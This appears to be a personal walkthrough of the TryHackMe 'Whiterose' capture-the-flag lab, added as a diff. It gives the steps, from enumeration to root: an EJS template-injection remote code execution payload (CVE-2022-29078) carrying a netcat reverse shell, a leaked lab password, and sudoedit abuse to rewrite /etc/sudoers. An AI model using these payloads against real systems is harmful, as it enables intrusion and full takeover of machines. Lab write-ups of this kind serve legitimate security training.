@@ -1,0 +1,44 @@
+https://tryhackme.com/room/whiterose
+
+Task 1
+
+1. What's Tyrell Wellick's phone number?
+ - Start by enumerating the machine, an nmap scan shows that port 80 is open
+ - nmap -sV <VM IP address>
+ - Try that in the browser, redirected to cyprusbank.thm, add that to /etc/hosts
+ - Try to identify subdomains and pages that are accessible
+ - ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cyprusbank.thm -H "Host: FUZZ.cyprusbank.thm" -fw 1
+ - Now to try admin.cyprusbank.thm and use the provided creds
+ - Clicking through everything, can't see Tyrell's phone number, someone else?
+ - Messages has nothing really, but does have a number at the end of the URL, start at the bottom with '0'
+ - Gayle's creds are there p~]P@5!6;rs558:q
+ - Logout and back in as Gayle
+ - There's the phone number: ***-***-****
+
+2. Take things a step further and compromise the machine.
+What is the user.txt flag?
+ - As Gayle keep looking around
+ - Gayle can access the Settings tab, this resets passwords, try something like test:test
+ - That works, but nothing really happens, switch to Burp and inspect it
+ - Everything looks normal, try playing with the values through Burp
+ - Just sending the username without the password field shows an error with .ejs
+ - Search for '.ejs vulnerability RCE' shows CVE-2022-29078 as an option
+ - Looking further, this might be able to be added into the POST request:
+    &settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('<choose your reverse shell>');s
+ - Use revshells.com to create 'BusyBox nc -e' script and put it in the command above
+ - Start a listener with NetCat 'nc -lvnp <port> and connect
+ - Better shell - python3 -c 'import pty; pty.spawn("/bin/bash")'
+ - CD to the top and read the user.txt file for the flag
+
+3. What is the root.txt flag?
+ - Need to escalate privilege, try 'sudo -l'
+ - Looks like Gayle can execute sudoedit as root w/out a password
+    - sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+ - Looking at exploits for privesc with sudoedit - https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit/
+ - export EDITOR="vim -- /etc/sudoers"
+ - sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+    - This took more attempts than it should have. VIM did not play nice when trying to navigate the file.
+ - add in permissions for user:web to be root
+    - web ALL=(ALL:ALL) NOPASSWORD:ALL
+ - sudo su root
+ - Find the flag
